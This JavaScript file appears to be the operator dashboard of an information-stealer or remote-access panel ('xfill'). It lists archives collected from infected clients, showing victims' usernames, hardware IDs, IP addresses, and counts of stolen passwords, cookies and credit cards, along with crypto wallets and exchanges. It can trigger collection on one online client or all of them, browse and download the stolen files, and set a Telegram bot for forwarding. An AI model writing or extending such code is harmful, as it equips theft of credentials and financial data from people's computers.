(() => {
  const PLUGIN_ID = "xfill";

  const tbody = document.getElementById("xf-tbody");
  const checkAll = document.getElementById("xf-check-all");
  const searchInput = document.getElementById("xf-search-input");
  const findBtn = document.getElementById("xf-find-btn");
  const statusEl = document.getElementById("xf-status");
  const clientSelect = document.getElementById("xf-client-select");
  const collectBtn = document.getElementById("xf-collect-btn");
  const collectAllBtn = document.getElementById("xf-collect-all-btn");

  const viewer = document.getElementById("xf-viewer");
  const viewerTitle = document.getElementById("xf-viewer-title");
  const treeEl = document.getElementById("xf-tree");
  const fileNameEl = document.getElementById("xf-file-name");
  const fileContentEl = document.getElementById("xf-file-content");
  const fileDownloadBtn = document.getElementById("xf-file-download");

  let archives = [];
  let filter = "";
  let sortKey = "";
  let sortDir = "desc";
  const selected = new Set();
  let currentFile = null; // { name, blob }

  /* ── helpers ── */

  function escapeHtml(text) {
    return String(text ?? "").replace(/[&<>"']/g, (ch) => ({
      "&": "&amp;",
      "<": "&lt;",
      ">": "&gt;",
      '"': "&quot;",
      "'": "&#39;",
    }[ch]));
  }

  function fmtNum(value) {
    const n = Number(value);
    return Number.isFinite(n) ? n.toLocaleString("en-US") : "0";
  }

  function fmtTime(iso) {
    const d = new Date(iso);
    if (Number.isNaN(d.getTime())) return iso || "";
    const pad = (n) => String(n).padStart(2, "0");
    return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
  }

  function joinList(value) {
    return Array.isArray(value) ? value.filter(Boolean).join(", ") : "";
  }

  async function rpc(method, params) {
    const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ method, params }),
      signal: AbortSignal.timeout(10000),
    });
    const body = await res.json().catch(() => ({}));
    if (!res.ok || body.ok === false) {
      throw new Error(body.error || res.statusText);
    }
    return body.result;
  }

  let statusTimer = null;
  function showStatus(text, isError = false, sticky = false) {
    statusEl.textContent = text;
    statusEl.classList.toggle("error", isError);
    statusEl.classList.remove("hidden");
    if (statusTimer) clearTimeout(statusTimer);
    if (!sticky) {
      statusTimer = setTimeout(() => statusEl.classList.add("hidden"), 8000);
    }
  }

  function archiveDownloadUrl(row) {
    return `/api/plugins/${PLUGIN_ID}/data/${encodeURIComponent(row.clientId)}/${encodeURIComponent(row.session)}.zip`;
  }

  /* ── table ── */

  function searchableText(row) {
    const info = row.info || {};
    return [
      info.Username, info.HWID, info.IpAddress, info.Country, info.Note,
      joinList(info.Browsers), joinList(info.Apps),
      joinList(info.DesktopWallets), joinList(info.BrowserExtensions),
      joinList(row.exchanges),
    ].join(" ").toLowerCase();
  }

  function filteredArchives() {
    let rows = filter ? archives.filter((row) => searchableText(row).includes(filter)) : [...archives];
    if (sortKey) {
      const key = sortKey;
      const dir = sortDir === "asc" ? 1 : -1;
      const numeric = new Set(["time", "domain", "passwords", "cookies", "cards", "seen"]);
      const val = (row) => {
        const info = row.info || {};
        switch (key) {
          case "time": return new Date(row.createdAt).getTime() || 0;
          case "username": return (info.Username || "").toLowerCase();
          case "hwid": return (info.HWID || "").toLowerCase();
          case "group": return (info.Group || "").toLowerCase();
          case "note": return (info.Note || "").toLowerCase();
          case "country": return (info.Country || "").toLowerCase();
          case "ip": return (info.IpAddress || "").toLowerCase();
          case "version": return (info.Version || "").toLowerCase();
          case "seen": return row.seen ? 1 : 0;
          case "domain": return Number(info.HistoryCount) || 0;
          case "browser": return joinList(info.Browsers).toLowerCase();
          case "extensions": return joinList(info.BrowserExtensions).toLowerCase();
          case "passwords": return Number(info.PasswordsCount) || 0;
          case "cookies": return Number(info.CookiesCount) || 0;
          case "cards": return Number(info.CreditCardsCount) || 0;
          case "wallets": return joinList(info.DesktopWallets).toLowerCase();
          case "exchanges": return joinList(row.exchanges).toLowerCase();
          case "apps": return joinList(info.Apps).toLowerCase();
          default: return "";
        }
      };
      rows.sort((a, b) => {
        const va = val(a), vb = val(b);
        if (numeric.has(key)) return (va - vb) * dir;
        return String(va).localeCompare(String(vb)) * dir;
      });
    }
    return rows;
  }

  // Raw 32-char extension IDs (unmapped extensions) are grouped for display;
  // the full list stays in the tooltip.
  function displayExtensions(value) {
    if (!Array.isArray(value)) return "";
    const known = [];
    let unknown = 0;
    for (const e of value.filter(Boolean)) {
      if (/^[a-z]{32}$/.test(e)) unknown++;
      else known.push(e);
    }
    if (unknown > 0) known.push(`${unknown} unknown`);
    return known.join(", ");
  }

  function renderTable() {
    const rows = filteredArchives();
    checkAll.checked = rows.length > 0 && rows.every((r) => selected.has(r.id));

    if (rows.length === 0) {
      tbody.innerHTML = `<tr><td colspan="21" class="xf-empty">${archives.length === 0 ? "No archives collected yet." : "No archives match the search."}</td></tr>`;
      return;
    }

    tbody.innerHTML = rows.map((row) => {
      const info = row.info || {};
      const checked = selected.has(row.id) ? "checked" : "";
      const rowCls = ["xf-row"];
      if (selected.has(row.id)) rowCls.push("xf-selected");
      if (row.seen) rowCls.push("xf-seen");
      const firstTime = info.FirstTime ? '<span class="xf-check-yes">✓</span>' : "";
      const seenChecked = row.seen ? "checked" : "";
      return `<tr data-id="${row.id}" class="${rowCls.join(" ")}">
        <td class="xf-col-check"><input type="checkbox" class="xf-row-check" data-id="${row.id}" ${checked} /></td>
        <td>${escapeHtml(fmtTime(row.createdAt))}${row.partial ? ' <span class="xf-partial" title="Partial archive — the connection dropped mid-transfer">⚠</span>' : ""}</td>
        <td title="${escapeHtml(info.Username)}">${escapeHtml(info.Username)}</td>
        <td title="${escapeHtml(info.HWID)}">${escapeHtml(info.HWID)}</td>
        <td>${escapeHtml(info.Group)}</td>
        <td title="${escapeHtml(info.Note)}">${escapeHtml(info.Note)}</td>
        <td>${escapeHtml(info.Country)}</td>
        <td>${escapeHtml(info.IpAddress)}</td>
        <td>${escapeHtml(info.Version)}</td>
        <td class="xf-col-center">${firstTime}</td>
        <td class="xf-col-center"><input type="checkbox" class="xf-seen-check" data-id="${row.id}" ${seenChecked} title="Mark reviewed" /></td>
        <td class="xf-col-num">${fmtNum(info.HistoryCount)}</td>
        <td class="xf-col-list" title="${escapeHtml(joinList(info.Browsers))}">${escapeHtml(joinList(info.Browsers))}</td>
        <td class="xf-col-list" title="${escapeHtml(joinList(info.BrowserExtensions))}">${escapeHtml(displayExtensions(info.BrowserExtensions))}</td>
        <td class="xf-col-num">${fmtNum(info.PasswordsCount)}</td>
        <td class="xf-col-num">${fmtNum(info.CookiesCount)}</td>
        <td class="xf-col-num">${fmtNum(info.CreditCardsCount)}</td>
        <td class="xf-col-list" title="${escapeHtml(joinList(info.DesktopWallets))}">${escapeHtml(joinList(info.DesktopWallets))}</td>
        <td class="xf-col-list" title="${escapeHtml(joinList(row.exchanges))}">${escapeHtml(joinList(row.exchanges))}</td>
        <td class="xf-col-list" title="${escapeHtml(joinList(info.Apps))}">${escapeHtml(joinList(info.Apps))}</td>
        <td class="xf-col-actions">
          <div class="xf-row-actions">
            <a class="xf-btn icon" href="${archiveDownloadUrl(row)}" title="Download archive" download><i class="fa-solid fa-download"></i></a>
            <button class="xf-btn icon danger xf-row-delete" data-id="${row.id}" title="Delete archive"><i class="fa-solid fa-trash"></i></button>
          </div>
        </td>
      </tr>`;
    }).join("");
  }

  async function loadArchives() {
    try {
      archives = await rpc("list");
      renderTable();
      // Cache the trimmed list for instant paint on next visit.
      try {
        localStorage.setItem("xfill-cache", JSON.stringify(archives.slice(0, 300)));
      } catch {}
    } catch (err) {
      tbody.innerHTML = `<tr><td colspan="20" class="xf-empty">Failed to load archives: ${escapeHtml(err.message)}</td></tr>`;
    }
  }

  // Instant paint from cache; the fresh fetch refreshes in the background.
  (function paintFromCache() {
    try {
      const cached = JSON.parse(localStorage.getItem("xfill-cache") || "null");
      if (Array.isArray(cached) && cached.length > 0) {
        archives = cached;
        renderTable();
      }
    } catch {}
  })();

  /* ── selection & toolbar ── */

  function selectedIds() {
    return filteredArchives().filter((r) => selected.has(r.id)).map((r) => r.id);
  }

  async function exportIds(ids) {
    if (ids.length === 0) {
      alert("No archives selected.");
      return;
    }
    try {
      const result = await rpc("exportMany", { ids });
      const a = document.createElement("a");
      a.href = `/api/plugins/${PLUGIN_ID}/data/exports/${encodeURIComponent(result.filename)}`;
      a.download = result.filename;
      document.body.appendChild(a);
      a.click();
      a.remove();
    } catch (err) {
      alert(`Export failed: ${err.message}`);
    }
  }

  async function removeIds(ids) {
    if (ids.length === 0) return;
    try {
      await rpc("remove", { ids });
      ids.forEach((id) => selected.delete(id));
      await loadArchives();
    } catch (err) {
      alert(`Delete failed: ${err.message}`);
    }
  }

  document.getElementById("xf-export-selected").addEventListener("click", () => exportIds(selectedIds()));
  document.getElementById("xf-export-all").addEventListener("click", () => exportIds(archives.map((r) => r.id)));

  document.getElementById("xf-delete-selected").addEventListener("click", () => {
    const ids = selectedIds();
    if (ids.length === 0) {
      alert("No archives selected.");
      return;
    }
    if (confirm(`Delete ${ids.length} selected archive(s)? This removes the zip files permanently.`)) {
      removeIds(ids);
    }
  });

  document.getElementById("xf-dedupe").addEventListener("click", async () => {
    try {
      const res = await rpc("dedupe");
      if (res.removed > 0) {
        showStatus(`removed ${res.removed} duplicate archive(s)`);
        await loadArchives();
      } else {
        showStatus("no duplicates found");
      }
    } catch (err) {
      showStatus(`dedupe failed: ${err.message}`, true);
    }
  });

  document.getElementById("xf-rescan").addEventListener("click", async () => {
    showStatus("rescanning archives for tags...");
    try {
      const res = await rpc("rescanTags");
      showStatus(`rescan complete (${res.updated} archives)`);
    } catch (err) {
      showStatus(`rescan failed: ${err.message}`, true);
    }
  });

  document.getElementById("xf-delete-seen").addEventListener("click", () => {
    const ids = archives.filter((r) => r.seen).map((r) => r.id);
    if (ids.length === 0) {
      alert("No seen archives to delete.");
      return;
    }
    if (confirm(`Delete ${ids.length} reviewed (seen) archive(s)? This removes the zip files permanently.`)) {
      removeIds(ids);
    }
  });

  document.getElementById("xf-delete-all").addEventListener("click", async () => {
    if (archives.length === 0) return;
    if (!confirm(`Delete ALL ${archives.length} archive(s)? This removes every zip file permanently.`)) return;
    try {
      await rpc("clear");
      selected.clear();
      await loadArchives();
    } catch (err) {
      alert(`Delete all failed: ${err.message}`);
    }
  });

  checkAll.addEventListener("change", () => {
    const rows = filteredArchives();
    if (checkAll.checked) rows.forEach((r) => selected.add(r.id));
    else rows.forEach((r) => selected.delete(r.id));
    renderTable();
  });

  tbody.addEventListener("change", (e) => {
    const seenBox = e.target.closest(".xf-seen-check");
    if (seenBox) {
      const id = Number(seenBox.dataset.id);
      const seen = seenBox.checked;
      const row = archives.find((r) => r.id === id);
      if (row) row.seen = seen;
      seenBox.closest("tr")?.classList.toggle("xf-seen", seen);
      rpc("setSeen", { ids: [id], seen }).catch((err) => showStatus(`seen update failed: ${err.message}`, true));
      return;
    }
    const box = e.target.closest(".xf-row-check");
    if (!box) return;
    const id = Number(box.dataset.id);
    if (box.checked) selected.add(id);
    else selected.delete(id);
    box.closest("tr")?.classList.toggle("xf-selected", box.checked);
    const rows = filteredArchives();
    checkAll.checked = rows.length > 0 && rows.every((r) => selected.has(r.id));
  });

  tbody.addEventListener("click", (e) => {
    if (e.target.closest(".xf-row-check") || e.target.closest(".xf-seen-check") || e.target.closest("a")) return;
    const delBtn = e.target.closest(".xf-row-delete");
    if (delBtn) {
      const id = Number(delBtn.dataset.id);
      if (confirm("Delete this archive?")) removeIds([id]);
      return;
    }
    const tr = e.target.closest("tr[data-id]");
    if (tr) openViewer(Number(tr.dataset.id));
  });

  /* ── search ── */

  function applySearch() {
    filter = searchInput.value.trim().toLowerCase();
    renderTable();
  }

  findBtn.addEventListener("click", applySearch);
  searchInput.addEventListener("keydown", (e) => {
    if (e.key === "Enter") applySearch();
  });

  /* ── collect ── */

  async function loadClients() {
    try {
      const res = await fetch("/api/clients?pageSize=200&status=online", { signal: AbortSignal.timeout(10000) });
      if (!res.ok) throw new Error(res.statusText);
      const data = await res.json();
      const online = (data.items || []).filter((c) => c.online);
      if (online.length === 0) {
        clientSelect.innerHTML = '<option value="">No clients online</option>';
        return;
      }
      clientSelect.innerHTML = '<option value="">Select client...</option>' + online.map((c) => {
        const label = `${c.host || c.id}${c.user ? ` (${c.user})` : ""}`;
        return `<option value="${escapeHtml(c.id)}">${escapeHtml(label)}</option>`;
      }).join("");
    } catch {
      clientSelect.innerHTML = '<option value="">Failed to load clients</option>';
    }
  }

  collectBtn.addEventListener("click", async () => {
    const clientId = clientSelect.value;
    if (!clientId) {
      alert("Select an online client first.");
      return;
    }
    collectBtn.disabled = true;
    try {
      const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/plugins/${PLUGIN_ID}/event`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ event: "collect", payload: {} }),
      });
      if (!res.ok) throw new Error(await res.text());
      showStatus(`collect triggered on ${clientId}`, false, true);
    } catch (err) {
      showStatus(`collect failed: ${err.message}`, true);
    } finally {
      collectBtn.disabled = false;
    }
  });

  if (collectAllBtn) {
    collectAllBtn.addEventListener("click", async () => {
      collectAllBtn.disabled = true;
      try {
        const res = await fetch("/api/clients?pageSize=500&status=online", { signal: AbortSignal.timeout(10000) });
        if (!res.ok) throw new Error(res.statusText);
        const data = await res.json();
        const online = (data.items || []).filter((c) => c.online);
        if (online.length === 0) {
          showStatus("no clients online", true);
          return;
        }
        let ok = 0;
        for (const c of online) {
          const r = await fetch(`/api/clients/${encodeURIComponent(c.id)}/plugins/${PLUGIN_ID}/event`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ event: "collect", payload: {} }),
          });
          if (r.ok) ok++;
        }
        showStatus(`collect triggered on ${ok}/${online.length} clients`, false, true);
      } catch (err) {
        showStatus(`collect all failed: ${err.message}`, true);
      } finally {
        collectAllBtn.disabled = false;
      }
    });
  }

  /* ── archive viewer ── */

  function buildTree(entries) {
    const root = { name: "", dirs: new Map(), files: [] };
    for (const entry of entries) {
      const parts = entry.path.replace(/\\/g, "/").split("/").filter(Boolean);
      let node = root;
      for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        const isFile = i === parts.length - 1 && !entry.path.endsWith("/");
        if (isFile) {
          node.files.push({ name: part, path: entry.path, size: entry.size });
        } else {
          if (!node.dirs.has(part)) node.dirs.set(part, { name: part, dirs: new Map(), files: [] });
          node = node.dirs.get(part);
        }
      }
    }
    return root;
  }

  function fmtSize(bytes) {
    const n = Number(bytes) || 0;
    if (n < 1024) return `${n} B`;
    if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
    return `${(n / (1024 * 1024)).toFixed(2)} MB`;
  }

  function renderTreeNode(node, container, archiveId) {
    const dirs = [...node.dirs.values()].sort((a, b) => a.name.localeCompare(b.name));
    for (const dir of dirs) {
      const wrap = document.createElement("div");
      wrap.className = "xf-tree-node";
      const row = document.createElement("button");
      row.className = "xf-tree-row";
      row.innerHTML = '<i class="fa-solid fa-chevron-right xf-tree-caret"></i><i class="fa-solid fa-folder xf-tree-icon"></i><span></span>';
      row.querySelector("span").textContent = dir.name;
      const children = document.createElement("div");
      children.className = "xf-tree-node hidden";
      row.addEventListener("click", () => {
        children.classList.toggle("hidden");
        row.querySelector(".xf-tree-caret").classList.toggle("open");
      });
      wrap.append(row, children);
      container.appendChild(wrap);
      renderTreeNode(dir, children, archiveId);
    }
    const files = [...node.files].sort((a, b) => a.name.localeCompare(b.name));
    for (const file of files) {
      const row = document.createElement("button");
      row.className = "xf-tree-row";
      row.innerHTML = '<span class="xf-tree-caret"></span><i class="fa-solid fa-file xf-tree-icon"></i><span></span><span class="xf-tree-size"></span>';
      row.querySelectorAll("span")[1].textContent = file.name;
      row.querySelector(".xf-tree-size").textContent = fmtSize(file.size);
      row.title = file.path;
      row.addEventListener("click", () => {
        treeEl.querySelectorAll(".xf-tree-row.active").forEach((el) => el.classList.remove("active"));
        row.classList.add("active");
        openFile(archiveId, file.path);
      });
      container.appendChild(row);
    }
  }

  async function openViewer(id) {
    const row = archives.find((r) => r.id === id);
    // Opening an archive marks it reviewed so duplicates can be cleaned up.
    if (row && !row.seen) {
      row.seen = true;
      renderTable();
      rpc("setSeen", { ids: [id], seen: true }).catch(() => {});
    }
    const info = row?.info || {};
    viewerTitle.textContent = row
      ? `${info.Username || row.clientId} — ${row.filename} (${fmtSize(row.size)})`
      : `Archive ${id}`;
    treeEl.innerHTML = '<div style="padding:10px;color:#64748b">Loading...</div>';
    fileNameEl.textContent = "Select a file";
    fileContentEl.textContent = "";
    fileDownloadBtn.classList.add("hidden");
    currentFile = null;
    viewer.showModal();

    try {
      const entries = await rpc("tree", { id });
      treeEl.innerHTML = "";
      if (entries.length === 0) {
        treeEl.innerHTML = '<div style="padding:10px;color:#64748b">Archive is empty.</div>';
        return;
      }
      const rootHost = document.createElement("div");
      treeEl.appendChild(rootHost);
      renderTreeNode(buildTree(entries), rootHost, id);
    } catch (err) {
      treeEl.innerHTML = `<div style="padding:10px;color:#fca5a5">Failed to read archive: ${escapeHtml(err.message)}</div>`;
    }
  }

  function setCurrentFile(name, blob) {
    currentFile = { name, blob };
    fileDownloadBtn.classList.remove("hidden");
  }

  async function openFile(archiveId, filePath) {
    fileNameEl.textContent = filePath;
    fileContentEl.textContent = "Loading...";
    fileDownloadBtn.classList.add("hidden");
    currentFile = null;
    try {
      const result = await rpc("file", { id: archiveId, path: filePath });
      const baseName = filePath.split(/[\\/]/).pop() || "file";
      if (typeof result.text === "string") {
        let display = result.text;
        try {
          const parsed = JSON.parse(result.text);
          display = JSON.stringify(parsed, null, 2);
        } catch {}
        fileContentEl.textContent = display;
        setCurrentFile(baseName, new Blob([result.text], { type: "text/plain" }));
      } else {
        const bytes = Uint8Array.from(atob(result.base64), (ch) => ch.charCodeAt(0));
        fileContentEl.textContent = `[binary file, ${fmtSize(result.size)} — use Download]`;
        setCurrentFile(baseName, new Blob([bytes], { type: "application/octet-stream" }));
      }
    } catch (err) {
      fileContentEl.textContent = `Failed to read file: ${err.message}`;
    }
  }

  fileDownloadBtn.addEventListener("click", () => {
    if (!currentFile) return;
    const url = URL.createObjectURL(currentFile.blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = currentFile.name;
    document.body.appendChild(a);
    a.click();
    a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 5000);
  });

  document.getElementById("xf-viewer-close").addEventListener("click", () => viewer.close());
  viewer.addEventListener("click", (e) => {
    if (e.target === viewer) viewer.close();
  });

  /* ── column sorting ── */

  document.querySelectorAll("th.xf-sortable").forEach((th) => {
    th.addEventListener("click", (e) => {
      e.stopPropagation();
      const key = th.dataset.sort;
      if (!key) return;
      if (sortKey === key) {
        sortDir = sortDir === "asc" ? "desc" : "asc";
      } else {
        sortKey = key;
        sortDir = "desc";
      }
      document.querySelectorAll("th.xf-sortable").forEach((h) => {
        h.classList.remove("xf-sort-asc", "xf-sort-desc");
      });
      th.classList.add(sortDir === "asc" ? "xf-sort-asc" : "xf-sort-desc");
      renderTable();
    });
  });

  /* ── telegram settings ── */

  const tgToggle = document.getElementById("xf-tg-toggle");
  const tgPanel = document.getElementById("xf-tg-panel");
  const tgEnabled = document.getElementById("xf-tg-enabled");
  const tgToken = document.getElementById("xf-tg-token");
  const tgChat = document.getElementById("xf-tg-chat");
  const tgStatus = document.getElementById("xf-tg-status");

  // Guard every binding: a stale cached HTML/JS pair must never kill the page.
  if (tgToggle && tgPanel && tgEnabled && tgToken && tgChat && tgStatus) {
    tgToggle.addEventListener("click", () => {
      tgPanel.classList.toggle("hidden");
    });

  async function loadTgSettings() {
    try {
      const s = await rpc("getSettings");
      tgEnabled.checked = !!s.telegramEnabled;
      tgChat.value = s.telegramChatId || "";
      tgToken.placeholder = s.telegramTokenSet
        ? `Token saved (${s.telegramTokenPreview}) — enter new to replace`
        : "Bot token (from @BotFather)";
    } catch {}
  }

  document.getElementById("xf-tg-save").addEventListener("click", async () => {
    try {
      await rpc("setSettings", {
        telegramEnabled: tgEnabled.checked,
        telegramChatId: tgChat.value,
        telegramToken: tgToken.value,
      });
      tgToken.value = "";
      await loadTgSettings();
      tgStatus.textContent = "saved";
      setTimeout(() => (tgStatus.textContent = ""), 4000);
    } catch (err) {
      tgStatus.textContent = `save failed: ${err.message}`;
    }
  });

  document.getElementById("xf-tg-test").addEventListener("click", async () => {
    tgStatus.textContent = "sending...";
    try {
      await rpc("testTelegram");
      tgStatus.textContent = "test sent ✓";
    } catch (err) {
      tgStatus.textContent = `test failed: ${err.message}`;
    }
    setTimeout(() => (tgStatus.textContent = ""), 6000);
  });

  loadTgSettings();
  }

  /* ── per-client collect status ── */

  const clientStatusEl = document.getElementById("xf-client-status");

  async function refreshClientStatus() {
    if (!clientStatusEl) return;
    try {
      const rows = await rpc("clientStatus");
      if (!Array.isArray(rows) || rows.length === 0) {
        clientStatusEl.classList.add("hidden");
        return;
      }
      const lines = rows.map((s) => {
        const ago = Math.max(0, Math.round((Date.now() - s.at) / 1000));
        const msg = s.message ? ` — ${s.message}` : "";
        return `${s.clientId.slice(0, 12)}…  ${s.stage}${msg}  (${ago}s ago)`;
      });
      clientStatusEl.textContent = lines.join("\n");
      clientStatusEl.classList.remove("hidden");
    } catch {}
  }

  refreshClientStatus();
  setInterval(refreshClientStatus, 15000);

  /* ── live updates ── */

  function connectStream() {
    const source = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
    source.addEventListener("archive_added", (e) => {
      try {
        const row = JSON.parse(e.data);
        archives = [row, ...archives.filter((r) => r.id !== row.id)];
        renderTable();
      } catch {
        loadArchives();
      }
      showStatus("new archive received");
    });
    source.addEventListener("progress", (e) => {
      try {
        const { clientId, stage } = JSON.parse(e.data);
        showStatus(`collecting [${clientId}]: ${stage}...`, false, true);
      } catch {}
    });
    source.addEventListener("collect_error", (e) => {
      try {
        const { clientId, stage, message } = JSON.parse(e.data);
        showStatus(`error [${clientId}]${stage ? ` at ${stage}` : ""}: ${message}`, true);
      } catch {}
    });
    source.onerror = () => {
      // EventSource reconnects automatically
    };
  }

  loadArchives();
  loadClients();
  connectStream();
})();
